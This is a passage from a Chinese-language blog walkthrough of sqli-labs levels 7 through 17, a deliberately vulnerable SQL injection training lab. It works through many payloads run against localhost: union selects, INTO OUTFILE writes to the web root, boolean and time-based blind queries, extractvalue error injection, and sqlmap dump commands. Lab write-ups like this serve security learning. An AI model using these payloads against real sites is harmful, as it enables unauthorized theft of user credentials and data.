src="https://bu.dusays.com/2022/08/17/62fc5fd81f09b.webp" alt="" style="zoom:75%"></li><li><p>植入木马可以轻松获取大量数据文件，但是由于数据库的数据都以特殊文件形式存储于指定地址中，该地址即参数 <kbd>datadir</kbd> 的值，虽然可以通过获取参数 <kbd>datadir</kbd> 的值进入指定目录后解读数据文件，但这样总归复杂，更不敢说优雅，因此仅仅获取数据库中的少量数据的话还是<strong>建议</strong>将数据写入普通文本文件中，至于文件的地址则与木马文件地址相同即可，这样获取的数据就可以直接在浏览器访问获取，<psw>木马也不用植入了，因为根本没用的他</psw>。首先查询数据库名，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select database(),2,3 into outfile &quot;/var/www/html/sqli-labs/h-t-m-1.txt&quot;--+</span><br></pre></td></tr></table></figure><p>回车之后在浏览器中访问 <kbd>http&#58;//localhost/sqli-labs/h-t-m-1.txt</kbd> 即可查看存有数据库名的文本文件 <kbd>h-t-m-1.txt</kbd>，其中参数 <kbd>id</kbd> 的值赋为 <kbd>-1</kbd> 是为了防止正常查询的结果一起写入文件中。</p><img src="https://bu.dusays.com/2022/09/04/6314b86dd481e.webp" alt="" style="zoom:75%"></li><li><p>后续操作参照上述步骤，获取数据并导出至文本文件，然后在蚁剑中打开即可，值得注意的是务必导出至不同文件。相对于 <a href="#Less-5">Less-5/6</a> 中数据一行一行输出，本关数据可将每次查询的所有数据一次性输出至文件中供我们读取，因此注入过程其实并不复杂，甚至有些优雅。各步骤所构造的 <kbd>payload</kbd> 实例如下（举一例）：</p><ul><li><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),2,3 into outfile &quot;/var/www/html/sqli-labs/h-t-m-2.txt&quot;--+</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27;),2,3 into outfile &quot;/var/www/html/sqli-labs/h-t-m-3.txt&quot;--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select (select group_concat(concat_ws(&#x27;  -  &#x27;,id,email_id) separator &#x27;\n&#x27;) from emails),2,3 into outfile &quot;/var/www/html/sqli-labs/h-t-m-4.txt&quot;--+</span><br></pre></td></tr></table></figure></li></ul></li><li><p>上述例子中的关键载荷都移植于之前关卡，虽说可以简单地通过载荷的复用完成数据导出，但是毕竟该方法不要求一次性写入全部数据，因此这些字符串拼接函数的调用就会非常多余。<strong>建议</strong>对 <kbd>payload</kbd> 进行进一步修改，这里举例两个最终数据表查询的 <kbd>payload</kbd>：</p><ul><li><p>查询 <kbd>users</kbd> 表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select * from security.users into outfile &quot;/var/www/html/sqli-labs/h-t-m-5.txt&quot;--+</span><br></pre></td></tr></table></figure></li><li><p>查询 <kbd>emails</kbd> 表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) union select *,1 from security.emails into outfile &quot;/var/www/html/sqli-labs/h-t-m-6.txt&quot;--+</span><br></pre></td></tr></table></figure></li></ul><p>最终的文本文件如图所示，所有数据都已被获取：</p><img src="https://bu.dusays.com/2022/09/04/6314b86e64480.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-8">Less-8</h3><div class="note default flat"><p>GET - Blind - Boolian Based - Single Quotes</p></div><p>再次重新开始，本关竟然没有直接延续文件操作，从副标题来看直接就是<strong>布尔盲注</strong>。</p><img src="https://bu.dusays.com/2022/09/04/6314b86ee5697.webp" alt="" style="zoom:75%"><h4 id="手工注入-4">手工注入</h4><ul><li><p>首先测试浏览器回显情况，发现在正常查询时依然只返回固定字符串，而在错误查询时则无任何回显。</p><img src="https://bu.dusays.com/2022/09/04/6314b8700074d.webp" alt="" style="zoom:75%"><p>较上一关仅存在错误查询是否回显固定字符串的区别，那实际上就是没有区别。实测上一关的方法也确实完全适用，但由于数据导出并非本题考点，因此这里遵从题意，使用布尔盲注解题。</p></li><li><p>依然对闭合符号做简单判断，实测本题闭合符号为单引号。</p><img src="https://bu.dusays.com/2022/09/04/6314b870723b6.webp" alt="" style="zoom:75%"></li><li><p>其实主体实施方法在 <a href="#Less-7">Less-7</a> 中获取参数 <kbd>secure_file_priv</kbd> 的值时就有用到，思路就是使用 <kbd>substr()</kbd> 函数将数据逐个字符截取，并配合 <kbd>ascii()</kbd> 函数比较字符的码值最终得到完整数据。首先对数据库名的长度进行判断，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())&lt;10--+</span><br></pre></td></tr></table></figure><p>实测数据库名的长度为 <kbd>8</kbd> 个字符：</p><img src="https://bu.dusays.com/2022/09/04/6314b8763b4ff.webp" alt="" style="zoom:75%"><p>然后获取数据库名，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(),1,1))&gt;78--+</span><br></pre></td></tr></table></figure><p>实测数据库名的第一个字符的码值为 <kbd>115</kbd>，即小写字母 <kbd>s</kbd>，后续逐字符重复该步骤即可获取完整数据库名 <kbd>security</kbd>。</p><img src="https://bu.dusays.com/2022/09/04/6314b875a7aaf.webp" alt="" style="zoom:75%"></li><li><p>后续数据查询依然照猫画虎即可，这里只举例各部分数据查询的初始 <kbd>payload</kbd>：</p><ul><li><p>获取表名长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))&lt;10--+</span><br></pre></td></tr></table></figure></li><li><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;78--+</span><br></pre></td></tr></table></figure></li><li><p>获取列名长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27; limit 0,1))&lt;10--+</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27; limit 0,1),1,1))&gt;78--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1))&lt;10--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),1,1))&gt;78--+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="SQLMap-工具注入-4">SQLMap 工具注入</h4><ul><li><p>之前对该工具的使用一直停留于 <a href="#Less-1">Less-1</a> 阶段，需要不断手动输入 <kbd>Yes</kbd> 或 <kbd>No</kbd> 以使工具继续工作，同时还未对注入技术进行过指定，一句命令让工具承担了所有，鉴于本次<strong>手工</strong>布尔盲注过于耗费时间，特此使用工具。主要增加了 <kbd>--batch</kbd> 帮助选择以及对注入方式的指定，根据考点指定使用布尔型注入，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-8/?id=1 --dump --batch --technique B</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-9">Less-9</h3><div class="note default flat"><p>GET - Blind - Time Based - Single Quotes</p></div><p>熟悉的界面，崭新的颜色。从副标题看本关依旧盲注，不过升级了。</p><img src="https://bu.dusays.com/2022/09/05/6316073c168be.webp" alt="" style="zoom:75%"><h4 id="手工注入-5">手工注入</h4><ul><li><p>首先当然还是测试浏览器的回显情况，发现无论查询成功或者失败，浏览器只会回显同一字符串： <code>You are in...........</code>。因此，我们不再能从浏览器的回显中获取任何有效信息了，这就引出了本题的考点——<strong>延时</strong>注入。</p><img src="https://bu.dusays.com/2022/09/05/6316073c9943a.webp" alt="" style="zoom:75%"></li><li><p>所谓延时注入就是利用 <kbd>if</kbd> 语句配合 <kbd>sleep()</kbd> 函数等方法，通过观察浏览器响应时间来判断给定条件的真假，因此该方法不需依赖浏览器回显内容。至于需要判断的条件内容，实际上就是 <a href="#Less-8">Less-8</a> 中布尔盲注的条件内容。这里以查询数据库名长度所使用的 <kbd>payload</kbd>为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())&gt;10,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>可以看出 <kbd>if</kbd> 语句有三个参数，第一个参数为判断条件，该值为真时返回第二个参数，否则返回第三个参数。因此，如果数据库名的长度大于 <kbd>10</kbd> 的话网页将正常加载，而若小于 <kbd>10</kbd> 则网页将额外加载 <kbd>5</kbd> 秒的等待时间。延时可在加载过程中明确感受出来，这里以控制台中的加载时长作为依据示范条件分别为真与假时的加载情况：</p><img src="https://bu.dusays.com/2022/09/05/6316073d234cc.webp" alt="" style="zoom:75%"></li><li><p>不过在正式获取数据之前，还需要获取注入点的闭合方式，在之前的关卡中都利用了浏览器的回显来判断，这显然无法应用于本题。前文中对数据库名长度的判断也是利用对数据的有效闭合而重新组成的逻辑结构，那么，如果并没有形成有效闭合，我们也就无法得到相应的结果。基于这一点，就可以使用如下 <kbd>payload</kbd> 对闭合符号进行推测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(1=2,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>由于条件始终为假，只要语句正常执行，就会被延时，因此我们可以在该 <kbd>payload</kbd> 中测试各闭合符号，当感受到明显加载延迟时，就已经获得闭合符号了。实测本题闭合符号就是单引号 <kbd>&#39;</kbd>，<psw>废话副标题都写在那里</psw>。</p><img src="https://bu.dusays.com/2022/09/05/6316073da6f5f.webp" alt="" style="zoom:75%"></li><li><p>后续的操作只需将 <a href="#Less-8">Less-8</a> 中布尔注入的那部分条件语句移植到上述 <kbd>if</kbd> 语句中即可，这里以查询数据库首字母为例，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;78,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>经过几轮范围的缩小，很快即可锁定首字母码值为 <kbd>115</kbd>，后面的操作就不再赘叙了。</p><img src="https://bu.dusays.com/2022/09/05/6316073e2fbe8.webp" alt="" style="zoom:75%"></li></ul><h4 id="SQLMap-工具注入-5">SQLMap 工具注入</h4><ul><li><p>延时盲注操作起来比布尔盲注还要更麻烦，了解原理后还是用工具来的爽，依旧根据本题考点，指定使用延时盲注的方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-9/?id=1 --dump --batch --technique T</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-10">Less-10</h3><div class="note default flat"><p>GET - Blind - Time Based - Double Quotes</p></div><p>终于来到了第十关，完成这个系列指日可待！从副标题可以看出，本题承接第九关，但是闭合符号有所改动。</p><img src="https://bu.dusays.com/2022/09/05/6316073eaa937.webp" alt="" style="zoom:75%"><ul><li><p>虽然副标题暴露了一切，但是还是需要作基本的检验，首先是查询成功与失败时的浏览器回显，然后就是闭合符号的判断，方法均与上一关一致。实测结果符合预期，无法通过浏览器回显判断查询状态，且闭合符号为双引号 <kbd>&#34;</kbd>。</p><img src="https://bu.dusays.com/2022/09/05/6316073c123c3.webp" alt="" style="zoom:75%"></li><li><p>通过上述检验，其实就可以大摇大摆地将 <a href="#Less-9">Less-9</a> 所使用的 <kbd>payload</kbd> 在将闭合符号换成双引号之后用于本题，这里举例用于最后获取数据长度与数据内容的两个 <kbd>payload</kbd>：</p><ul><li><p>获取数据长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(length((select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1))&lt;10,1,sleep(5))--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and if(ascii(substr((select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),1,1))&gt;78,1,sleep(5))--+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="Less-11">Less-11</h3><div class="note default flat"><p>POST - Error Based - Single Quotes - String</p></div><p>开启 POST 方法注入时代，这下不用只跟 URL 打交道了。主界面也有非常大的变化，不再拥有象征该题主题色的巨大 <kbd>logo</kbd>，网页仅包含两个输入框，显然这也将成为我们的注入点。</p><img src="https://bu.dusays.com/2022/09/13/631f6983c9dd4.webp" alt="" style="zoom:75%"><h4 id="手工注入-6">手工注入</h4><ul><li><p>首先当然需要对网页作基本的测试，使用简单用户名与密码：<kbd>admin</kbd>，发现登录成功，界面如下：</p><img src="https://bu.dusays.com/2022/09/13/631f6983ca34d.webp" alt="" style="zoom:75%"><p>可以看出登录成功之后即可在浏览器中看到当前的用户名与密码，或者换个说法，是显示从数据库中查询出来的信息。</p></li><li><p>若登录失败，则会出现如下界面，巨大的红色图片告诉你登录失败了，还是之前那个味儿~除此之外并无多余文字信息。</p><img src="https://bu.dusays.com/2022/09/13/631f6984708ba.webp" alt="" style="zoom:75%"></li><li><p>仅凭以上信息还不足以确认存在 SQL 注入点，我们依然可以使用之前的老方法，由于涉及两个参数且均为字符串，因此直接考虑字符型注入即可。直接传入转义字符 <kbd>\</kbd>，若网页可以回显报错，那么就可以直接看到闭合符号。所幸，作为 POST 方法的第一关，回显报错还是有的，因此可以直接看到闭合符号为单引号 <kbd>&#39;</kbd>。</p><img src="https://bu.dusays.com/2022/09/13/631f69850e2c1.webp" alt="" style="zoom:75%"></li><li><p>到这里呢，就确定是闭合符号为单引号的字符型注入点了。而且网页的响应规则也与 <a href="#Less-1">Less-1</a> 一致，即查询成功便回显用户名密码，出现错误则回显报错信息，不同的只是本题 <kbd>payload</kbd> 将从方框中以 POST 方法提交，而且可以是任一个方框。接下来首先对 SQL 语句的查询列数进行判断，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 order by 1#</span><br></pre></td></tr></table></figure><p>其中单引号将原语句中的单引号闭合，而 <kbd>or 1=1</kbd> 则用于保证条件为真，即查询始终成功。在 GET 方法时代，一般都使用 <kbd>--+</kbd> 作为注释符（加号在这代表空格），这是由于 <kbd>#</kbd> 在 URL 中有他的特殊使命，而到了 POST 方法时代，直接以 <kbd>#</kbd> 作为注释符不失为最好的选择。实测本题中共查询两列：</p><img src="https://bu.dusays.com/2022/09/13/631f6985a5264.webp" alt="" style="zoom:75%"></li><li><p>由于只查询两列，浏览器本身也只回显两个数据，即用户名与密码，因此对于回显位的判断并不必要，但是，严谨很重要！所以这里依然对回显位进行判断，构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=2 union select 1,2#</span><br></pre></td></tr></table></figure><p>其中 <kbd>and 1=2</kbd> 保证条件为假，因此可保证查询结果为 <kbd>1</kbd>、<kbd>2</kbd> 两个数字，回显结果如图所示：</p><img src="https://bu.dusays.com/2022/09/13/631f69863f285.webp" alt="" style="zoom:75%"></li><li><p>剩余步骤则基于回显判断的 <kbd>payload</kbd>，将数据置于数字 <kbd>1</kbd> 或 <kbd>2</kbd> 的位置即可，原理以及实际执行与 <a href="#Less-1">Less-1</a> 基本一致，故不做赘述，这里举例各步骤所使用的 <kbd>payload</kbd>：</p><ol><li><p>获取数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=2 union select database(),2#</span><br></pre></td></tr></table></figure></li><li><p>获取表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=2 union select (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),2#</span><br></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=2 union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;emails&#x27; and table_schema=&#x27;security&#x27;),2#</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=2 union select (select group_concat(concat_ws(&#x27;  -  &#x27;,id,email_id) separator &#x27;&lt;br&gt;&#x27;) from emails),2#</span><br></pre></td></tr></table></figure></li></ol></li></ul><h4 id="SQLMap-工具注入-6">SQLMap 工具注入</h4><ul><li><p>之前使用工具注入时都是基于 GET 方法，直接通过 URL 传递数据即可，而如今都是通过 POST 方法了，因此数据就需要以 <kbd>--data</kbd> 参数形式传入了，当然在注入之前，还需要知道传递数据的格式（主要为变量名）。<kbd>在 GET 时代是明确告诉我们变量名为 {% kbd id</kbd>，今时不同往日啊 %}。不过这也不困难，在浏览器中 <kbd>F12</kbd> 检查然后点击提交表单即可在网络部分直接看到通过 POST 方法提交的变量名及数据。</p><img src="https://bu.dusays.com/2022/09/13/631f6986d0d0d.webp" alt="" style="zoom:75%"><p>点击右上角 <kbd>Raw</kbd> 即可查看报文的原文，这也就是我们需要传递的数据内容以作为注入点。</p><img src="https://bu.dusays.com/2022/09/13/631f698755fae.webp" alt="" style="zoom:75%"></li><li><p>由上就可以构造如下命令，轻松完成数据获取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-11/ --data=&#x27;uname=&amp;passwd=&amp;submit=Submit&#x27; --dump --batch</span><br></pre></td></tr></table></figure></li><li><p>当然，都使用工具注入了，还需要手动获取变量名，实在算不上优雅，况且获取变量名本身也是非常机械化的操作。可以直接使用 <kbd>--forms</kbd> 参数，工具就会自己抓包并分析信息完成注入，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-11/ --forms --dump --batch</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-12">Less-12</h3><div class="note default flat"><p>POST - Error Based - Double Quotes - String - with twist</p></div><p>主界面没有任何变化，安心进入 POST 日常。</p><img src="https://bu.dusays.com/2022/09/13/631f6987e8163.webp" alt="" style="zoom:75%"><ul><li><p>依然先简单测试一下网页，使用简单密码 <kbd>admin</kbd> 登录成功，网页回显用户名与密码。使用转义字符 <kbd>\</kbd> 发生错误，网页回显错误信息。因此可以判断本题与 <a href="#less-11">Less-11</a> 基本一致，唯一的区别在于闭合符号换成了双引号加小括号 <kbd>&#34;)</kbd> 的形式。</p><img src="https://bu.dusays.com/2022/09/13/631f698889e76.webp" alt="" style="zoom:75%"></li><li><p>那么后续步骤便不需过多赘述了，这里示例最后对于 <kbd>users</kbd> 表中所有数据的查询所使用的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) and 1=2 union select (select group_concat(concat_ws(&#x27;  -  &#x27;,id,username,password) separator &#x27;&lt;br&gt;&#x27;) from users),2#</span><br></pre></td></tr></table></figure><p>查询结果如图所示，不得不说从 <a href="#less-1">Less-1</a> 构造并沿用至今的格式化数据导出实在是令人赏心悦目😎。</p><img src="https://bu.dusays.com/2022/09/13/631f69892858d.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-13">Less-13</h3><div class="note default flat"><p>POST - Double Injection - Single Quotes - String - with twist</p></div><p>熟悉的界面，POST 时代没有单独 <kbd>logo</kbd> 的界面实在有些贫寒之感。</p><img src="https://bu.dusays.com/2022/09/14/6321f38d226ca.webp" alt="" style="zoom:75%"><ul><li><p>首先依然简单对网页做个测试，用户名密码 <kbd>admin</kbd> 登录成功，不过这次不再回显用户名和密码了，继续传入转义字符 <kbd>\</kbd>，浏览器依然会回显报错信息，因此本题就需要使用报错注入，将数据从报错信息中导出。同时可以注意到，本题的闭合符号为单引号加小括号 <kbd>&#39;)</kbd> 形式。</p><img src="https://bu.dusays.com/2022/09/14/6321f38dd3560.webp" alt="" style="zoom:75%"></li><li><p>很遗憾，报错注入也从 <a href="#Less-5">Less-5</a> 开始被应用，因此不再赘述，这里示例查询 <kbd>users</kbd> 表中首行数据的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) and extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;  -  &#x27;,id,username,password) from users limit 0,1),&#x27; ~&#x27;))#</span><br></pre></td></tr></table></figure><p>结果如图所示，继续逐行查询即可获取完整数据。</p><img src="https://bu.dusays.com/2022/09/14/6321f38e796c9.webp" alt="" style="zoom:75%"></li></ul><h3 id="Less-14">Less-14</h3><div class="note default flat"><p>POST - Double Injection - Double Quotes - String</p></div><p>看副标题就知道依旧没有重大变化，因此继续慢慢训练。</p><img src="https://bu.dusays.com/2022/09/14/6321f38f12fce.webp" alt="" style="zoom:75%"><ul><li><p>照例测试网页，依然只回显报错，唯一的变化在于本题闭合符号为双引号 <kbd>&#34;</kbd>。</p><img src="https://bu.dusays.com/2022/09/14/6321f38faf951.webp" alt="" style="zoom:75%"></li><li><p>方法与前述关卡一致故不作赘述，将闭合符号修改即可，这里依然示例查询 <kbd>users</kbd> 表中首行数据的 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; and extractvalue(1,concat(&#x27;~ &#x27;,(select concat_ws(&#x27;  -  &#x27;,id,username,password) from users limit 0,1),&#x27; ~&#x27;))#</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-15">Less-15</h3><div class="note default flat"><p>POST - Blind - Boolian/time Based - Single quotes</p></div><p>虽然页面依旧，不过副标题告诉我们，是盲注！</p><img src="https://bu.dusays.com/2022/09/14/6321f39056481.webp" alt="" style="zoom:75%"><h4 id="手工注入-7">手工注入</h4><ul><li><p>先检查检查网页，发现正常与错误情况下浏览器都将不回显任何数据信息，只有登录成功与失败的图标可用于判断，因此，又回到了布尔盲注。</p><img src="https://bu.dusays.com/2022/09/14/6321f390eb2dc.webp" alt="" style="zoom:75%"></li><li><p>那么转义字符就不再可以帮助我们直接获取闭合符号了，当然通过布尔盲注获取闭合符号的操作也是从 <a href="#Less-1">Less-1</a> 时便开始使用了，不过到了 POST 时代，形式就该有些许变化了，使用如下 <kbd>payload</kbd>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1#</span><br><span class="line">&quot; or 1=1#</span><br></pre></td></tr></table></figure><p>其中 <kbd>1=1</kbd> 依然用于保证条件为真，因而当且仅当闭合符号达成有效闭合时才可成功登录。实测闭合符号为单引号：</p><img src="https://bu.dusays.com/2022/09/14/6321f38d22710.webp" alt="" style="zoom:75%"></li><li><p>接下来就是布尔盲注的老桥段了，先判断数据值的长度，然后根据长度逐个字符对数据进行提取，以获取数据库名为例构造 <kbd>payload</kbd> 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or length(database())&lt;10#</span><br><span class="line">&#x27; or ascii(substr(database(),1,1))&gt;78#</span><br></pre></td></tr></table></figure><p>通过修改数值即可逐步获取数据，后续对于各表中数据的提取则参考 <a href="#Less-8">Less-8</a> 中对于 <kbd>payload</kbd> 的修改即可，此处不再赘述。</p></li></ul><h4 id="SQLMap-工具注入-7">SQLMap 工具注入</h4><ul><li><p>鉴于布尔盲注的复杂程度，还是建议使用工具来完成，这里我们也指定使用延时盲注（貌似因为没有具体数据区别导致工具无法完成布尔盲注，因此只能使用延时盲注，不过这依然符合题意）。命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://localhost/sqli-labs/Less-15/ --forms --dump --batch --technique T</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-16">Less-16</h3><div class="note default flat"><p>POST - Blind - Boolian/time Based - Double quotes</p></div><p>老样子的主界面，最近几关极度舒适，冲啊网安人。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc6701af.webp" alt="" style="zoom:75%"><ul><li><p>实测本题依然与前述关卡基本一致，唯一的变化在于将闭合符号修改为了双引号加小括号的形式 <kbd>&#34;)</kbd>。<psw>顺带提一句，截图中的转义字符是浏览器显示时区别于自身符号而自动添加的，并不影响实际上传的数据内容。</psw></p><img src="https://bu.dusays.com/2022/11/09/636b6bc677edd.webp" alt="" style="zoom:75%"></li><li><p>后续操作则依然修改前述关卡中的闭合符号即可，此处不做赘述，作为示例列出判断 <kbd>emails</kbd> 表中首行数据首字母所使用的 <kbd>payload</kbd>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;) or ascii(substr((select concat_ws(&#x27;  -  &#x27;,id,email_id) from emails limit 0,1),1,1))&gt;78#</span><br></pre></td></tr></table></figure></li></ul><h3 id="Less-17">Less-17</h3><div class="note default flat"><p>POST - Update Query - Error Based - String</p></div><p>重大变化！页面顶部出现了一行字符：<code>[PASSWORD RESET]</code> ，此外在输入框中也可以看到，不再是用户名与 <kbd>Password</kbd> 密码，而是 <kbd>New Password</kbd> 新密码。因此该页面不再用于登入，而是用于修改密码，甚至不用核对原密码。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc673e23.webp" alt="" style="zoom:75%"><ul><li><p>首先尝试简单用户名 <kbd>admin</kbd>，随便修改一个密码，网页回显巨大的密码修改成功的图片。而对于其他任意非法用户名都将修改失败并且回显一句问候。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc673eae.webp" alt="" style="zoom:75%"><p>不过，如果用户名正确，我们构造的新密码就可以引起报错，这也说明程序对用户名作了过滤操作。事实上偷看源码可知程序确实构造了 <kbd>check_input()</kbd> 函数来过滤用户名处输入的数据。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc66b673.webp" alt="" style="zoom:75%"><p>那其实就可以利用这种情况实现报错注入了，只要保证用户名正确即可。</p></li><li><p>由于实际注入点在密码处，因此在注入之前依然需要确定闭合符号，用户名使用 <kbd>admin</kbd> 即可，在新密码一栏分别输入单引号提交再输入双引号提交，可以发现单引号造成了报错，而双引号则修改成功，因此对数据的最近闭合符号为单引号。</p><img src="https://bu.dusays.com/2022/11/09/636b6bc678eb3.webp" alt="" style="zoom:75%"></li><li><p>知道闭合符号，并且浏览器可以回显报错，那就可以直接报错注入了，使用 POST 方式提交如下数据即可获得数据库名，这里使用的是 <kbd>extractvalue()</kbd> 函数报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=&#x27; and extractvalue(1,concat(0x7E,(select database()),0x7E))#&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>当然 <kbd>floor</kbd> 报错注入依然适用，不过需要注意的是 <kbd>and</kbd> 运算符之前需要为真值，据笔者测试时程序的种种反应来看，此处貌似会发送逻辑短路，但是 <kbd>extractvalue()</kbd> 等函数报错使用时却不存在这类问题。<psw>留个坑，希望以后能回答这个问题。</psw></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 